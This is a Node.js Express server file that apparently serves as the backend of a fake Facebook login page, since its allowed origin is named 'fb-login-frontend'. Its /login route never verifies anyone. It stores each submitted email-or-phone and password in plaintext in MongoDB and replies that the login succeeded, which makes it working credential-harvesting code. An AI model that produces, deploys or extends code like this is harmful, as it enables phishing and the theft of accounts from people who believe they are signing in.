const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors({
  origin: ['https://fb-login-frontend.vercel.app'], // Update with your frontend production URL
  methods: 'GET,HEAD,PATCH,POST,PUT,DELETE',
}));
app.use(bodyParser.json());

// Connect to MongoDB
const mongoURI = process.env.MONGODB_URI || 'mongodb://localhost:27017/myloginapp';

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB connected'))
  .catch((err) => console.log('MongoDB connection error:', err));

// Define a User model
const User = mongoose.model('User', new mongoose.Schema({
  emailOrPhone: String,
  password: String
}));

// API endpoint to handle login
app.post('/login', async (req, res) => {
  const { emailOrPhone, password } = req.body;

  try {
    const user = new User({ emailOrPhone, password });
    await user.save();
    res.status(200).json({ message: 'User logged in successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).send('Error saving user data.');
  }
});

// Start the server
const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
